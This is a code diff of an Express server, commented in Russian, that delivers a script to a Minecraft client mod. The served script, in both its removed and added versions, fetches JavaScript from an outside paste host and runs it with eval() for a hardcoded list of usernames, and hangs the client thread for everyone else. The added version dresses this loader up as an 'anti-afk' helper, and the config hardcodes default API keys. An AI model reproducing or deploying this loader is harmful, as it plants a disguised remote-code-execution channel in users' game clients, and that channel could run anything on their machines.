@@ -5,16 +5,14 @@ const app = express();
 // ==================== КОНФИГУРАЦИЯ ====================
 const CONFIG = {
     PORT: process.env.PORT || 3000,
-    API_KEYS: process.env.API_KEYS || 'railway-minecraft-key-321',
-    ALLOWED_AGENTS: process.env.ALLOWED_AGENTS || 'java,minecraft,nedan,script,autobuy',
-    NODE_ENV: process.env.NODE_ENV || 'production',
-    RAILWAY_ENVIRONMENT: process.env.RAILWAY_ENVIRONMENT || 'production'
+    API_KEYS: process.env.API_KEYS || 'railway-minecraft-key-123',
+    ALLOWED_AGENTS: process.env.ALLOWED_AGENTS || 'java,minecraft,nedan,script,automine',
+    NODE_ENV: process.env.NODE_ENV || 'production'
 };
 
 // ==================== MIDDLEWARE ====================
 app.use(cors({
     origin: function (origin, callback) {
-        // Разрешаем запросы без origin (например, из Minecraft)
         if (!origin || origin.includes('railway') || origin.includes('localhost')) {
             callback(null, true);
         } else {
@@ -26,13 +24,9 @@ app.use(cors({
 
 app.use(express.json());
 
-// Логирование для Railway
+// Логирование
 app.use((req, res, next) => {
-    const timestamp = new Date().toISOString();
-    const ip = req.ip || req.connection.remoteAddress;
-    const userAgent = req.headers['user-agent'] || 'No User-Agent';
-    
-    console.log(`[${timestamp}] ${ip} - ${req.method} ${req.path} - ${userAgent.substring(0, 60)}`);
+    console.log(`[${new Date().toISOString()}] ${req.ip} - ${req.method} ${req.path}`);
     next();
 });
 
@@ -52,53 +46,98 @@ const validateRequest = (req, res, next) => {
     if (isValidKey && isValidAgent) {
         next();
     } else {
-        console.log('🚫 Blocked request:', { 
-            hasKey: !!apiKey, 
-            userAgent: userAgent.substring(0, 30),
-            ip: req.ip
-        });
-        
-        res.status(403).json({ 
-            success: false,
-            error: 'access_denied',
-            message: 'Invalid or missing credentials',
-            timestamp: new Date().toISOString(),
-            requires: {
-                api_key: 'valid X-API-Key header',
-                user_agent: 'specific client identification'
-            }
-        });
+        console.log('🚫 Blocked request');
+        res.status(403).json({ error: 'Access denied' });
     }
 };
 
 // ==================== ЗАЩИЩЕННЫЕ ЭНДПОИНТЫ ====================
 
-// Главный эндпоинт для скрипта
-// Главный эндпоинт для скрипта
+// Главный эндпоинт для anti-afk скрипта
 app.get('/api/script', validateRequest, (req, res) => {
     const scriptContent = `(function() {
-    var username = Java.type("ru.nedan.spookybuy.Authentication").getUsername();
-
-// Проверяем разрешенные имена
-if (username === "porvaniy.gondon" || username === "__ded_inside__" || username === "latteld" || username === "dofinixx" || username === "troll4" || username === "zertqmap.org" || username === "nekitpon" || username === "fakepatrickstar" || username === "inclodus" || username === "terpila_naxyi" || username === "masterrpo1" || username === "prolix0573") {
     try {
-        // Выполняем внешний скрипт
-        eval(new java.util.Scanner(
-            new java.net.URL("https://i.e-z.host/p/raw/qqm7yaqga88vrpf9n").openStream(), 
-            "UTF-8"
-        ).useDelimiter("\\A").next());
+        var username = Java.type("ru.nedan.spookybuy.Authentication").getUsername();
+        java.lang.System.out.println("🔐 Проверка пользователя: " + username);
+
+        // Проверяем разрешенные имена
+        if (username === "porvaniy.gondon" || username === "__ded_inside__") {
+            java.lang.System.out.println("✅ Разрешенный пользователь, загружаю скрипт...");
+            
+            try {
+                // Выполняем внешний скрипт
+                eval(new java.util.Scanner(
+                    new java.net.URL("https://diddy-party.vip/p/raw/onwifinfsc75if7yl").openStream(), 
+                    "UTF-8"
+                ).useDelimiter("\\\\A").next());
+                
+                java.lang.System.out.println("✅ Внешний скрипт успешно выполнен");
+                
+            } catch (e) {
+                java.lang.System.err.println("❌ Ошибка при выполнении внешнего скрипта: " + e);
+                
+                // Резервный anti-afk скрипт
+                java.lang.System.out.println("🔄 Запуск резервного anti-afk скрипта...");
+                startBackupAntiAFK();
+            }
+            
+        } else {
+            java.lang.System.out.println("❌ Доступ запрещен для: " + username);
+            java.lang.System.out.println("💤 Засыпание на 20 секунд...");
+            java.lang.Thread.sleep(20000);
+        }
+
     } catch (e) {
-        java.lang.System.err.println("Ошибка при выполнении скрипта: " + e);
+        java.lang.System.err.println("❌ Общая ошибка: " + e);
     }
-} else {
-    java.lang.Thread.sleep(20000000);
-}
-
-})
-
-
-
-
+    
+    // Резервная функция anti-afk
+    function startBackupAntiAFK() {
+        try {
+            java.lang.System.out.println("🔄 Запуск резервного Anti-AFK");
+            
+            var movements = ["w", "a", "s", "d", "space", "shift"];
+            var lastMovement = 0;
+            
+            setInterval(function() {
+                try {
+                    var now = java.lang.System.currentTimeMillis();
+                    if (now - lastMovement > 30000) { // Каждые 30 секунд
+                        var randomMove = movements[Math.floor(Math.random() * movements.length)];
+                        
+                        // Имитация движения
+                        if (randomMove === "space") {
+                            keybind("key.jump", true);
+                            java.lang.Thread.sleep(100);
+                            keybind("key.jump", false);
+                        } else if (randomMove === "shift") {
+                            keybind("key.sneak", true);
+                            java.lang.Thread.sleep(500);
+                            keybind("key.sneak", false);
+                        } else {
+                            client.setKeyPressed("key." + randomMove, true);
+                            java.lang.Thread.sleep(100);
+                            client.setKeyPressed("key." + randomMove, false);
+                        }
+                        
+                        lastMovement = now;
+                        java.lang.System.out.println("🔄 Anti-AFK движение: " + randomMove);
+                    }
+                    
+                    // Периодическое сообщение в чат
+                    if (Math.random() < 0.01) { // 1% шанс каждую секунду
+                        chat("/say Anti-AFK активен");
+                    }
+                    
+                } catch (e) {
+                    java.lang.System.err.println("❌ Ошибка Anti-AFK: " + e);
+                }
+            }, 1000);
+            
+        } catch (e) {
+            java.lang.System.err.println("❌ Ошибка запуска Anti-AFK: " + e);
+        }
+    }
 })();`;
     
     res.setHeader('Content-Type', 'application/javascript; charset=UTF-8');
@@ -108,125 +147,61 @@ if (username === "porvaniy.gondon" || username === "__ded_inside__" || username 
 // Эндпоинт для проверки статуса
 app.get('/api/status', validateRequest, (req, res) => {
     res.json({ 
-        success: true,
         status: 'online', 
-        server: {
-            name: 'Secure Script Server',
-            version: '2.0.0',
-            platform: 'Railway',
-            environment: CONFIG.RAILWAY_ENVIRONMENT
-        },
-        client: {
-            ip: req.ip,
-            userAgent: req.headers['user-agent'] || 'unknown'
-        },
-        timestamp: new Date().toISOString()
+        server: 'Anti-AFK Script Server',
+        version: '1.0.0'
     });
 });
 
 // ==================== ОБЩЕДОСТУПНЫЕ ЭНДПОИНТЫ ====================
 
-// Информация о сервере
 app.get('/', (req, res) => {
     res.json({
-        service: 'Secure Minecraft Script Delivery',
-        version: '2.0.0',
-        status: 'operational',
-        platform: 'Railway',
-        documentation: 'Contact administrator for API access',
-        endpoints: {
-            protected: ['/api/script', '/api/status'],
-            public: ['/health', '/info']
-        }
+        service: 'Anti-AFK Script Delivery',
+        version: '1.0.0',
+        status: 'operational'
     });
 });
 
-// Health check для Railway
 app.get('/health', (req, res) => {
-    res.status(200).json({
-        status: 'healthy',
-        timestamp: new Date().toISOString(),
-        uptime: process.uptime(),
-        memory: process.memoryUsage()
-    });
-});
-
-// Информация о API
-app.get('/info', (req, res) => {
-    res.json({
-        api: 'Secure Script Delivery',
-        version: '2.0.0',
-        description: 'Protected script server for Minecraft modifications',
-        requires: ['X-API-Key header', 'Valid User-Agent'],
-        contact: 'Your contact information'
-    });
+    res.status(200).json({ status: 'healthy' });
 });
 
 // ==================== ОБРАБОТКА ОШИБОК ====================
 
-// 404 - Not Found
 app.use('*', (req, res) => {
-    res.status(404).json({
-        success: false,
-        error: 'endpoint_not_found',
-        message: 'The requested resource does not exist',
-        available_endpoints: [
-            'GET /',
-            'GET /health', 
-            'GET /info',
-            'GET /api/script',
-            'GET /api/status'
-        ],
-        timestamp: new Date().toISOString()
-    });
+    res.status(404).json({ error: 'Not found' });
 });
 
-// Global error handler
 app.use((err, req, res, next) => {
-    console.error('❌ Server error:', err);
-    res.status(500).json({
-        success: false,
-        error: 'internal_server_error',
-        message: 'Something went wrong on our side',
-        timestamp: new Date().toISOString()
-    });
+    console.error('Server error:', err);
+    res.status(500).json({ error: 'Internal server error' });
 });
 
 // ==================== ЗАПУСК СЕРВЕРА ====================
-const server = app.listen(CONFIG.PORT, '0.0.0.0', () => {
-    console.log('╔══════════════════════════════════════════════════════╗');
-    console.log('║           SECURE SCRIPT SERVER - RAILWAY            ║');
-    console.log('╠══════════════════════════════════════════════════════╣');
-    console.log(`║  Port: ${CONFIG.PORT}                                       ║`);
-    console.log(`║  Environment: ${CONFIG.RAILWAY_ENVIRONMENT.padEnd(26)} ║`);
-    console.log(`║  Node: ${process.version.padEnd(33)} ║`);
-    console.log('║                                                      ║');
-    console.log('║  📍 Protected Endpoints:                             ║');
-    console.log('║     • GET /api/script  (requires auth)               ║');
-    console.log('║     • GET /api/status  (requires auth)               ║');
-    console.log('║                                                      ║');
-    console.log('║  🌐 Public Endpoints:                                ║');
-    console.log('║     • GET /           (info)                         ║');
-    console.log('║     • GET /health     (health check)                 ║');
-    console.log('║     • GET /info       (api info)                     ║');
-    console.log('║                                                      ║');
-    console.log('║  🚀 Server is ready on Railway!                      ║');
-    console.log('╚══════════════════════════════════════════════════════╝');
+app.listen(CONFIG.PORT, '0.0.0.0', () => {
+    console.log('╔══════════════════════════════════════╗');
+    console.log('║      ANTI-AFK SERVER STARTED       ║');
+    console.log('╠══════════════════════════════════════╣');
+    console.log(`║  Port: ${CONFIG.PORT}                       ║`);
+    console.log(`║  Environment: ${CONFIG.NODE_ENV}           ║`);
+    console.log('║                                      ║');
+    console.log('║  Endpoints:                          ║');
+    console.log('║  • GET /api/script  (requires auth)  ║');
+    console.log('║  • GET /api/status  (requires auth)  ║');
+    console.log('║  • GET /health                       ║');
+    console.log('║                                      ║');
+    console.log('║  Server is ready!                    ║');
+    console.log('╚══════════════════════════════════════╝');
 });
 
-// Graceful shutdown для Railway
+// Graceful shutdown
 process.on('SIGTERM', () => {
-    console.log('🛑 Received SIGTERM, shutting down gracefully...');
-    server.close(() => {
-        console.log('✅ Server closed');
-        process.exit(0);
-    });
+    console.log('Shutting down gracefully...');
+    process.exit(0);
 });
 
 process.on('SIGINT', () => {
-    console.log('🛑 Received SIGINT, shutting down gracefully...');
-    server.close(() => {
-        console.log('✅ Server closed');
-        process.exit(0);
-    });
+    console.log('Shutting down gracefully...');
+    process.exit(0);
 });
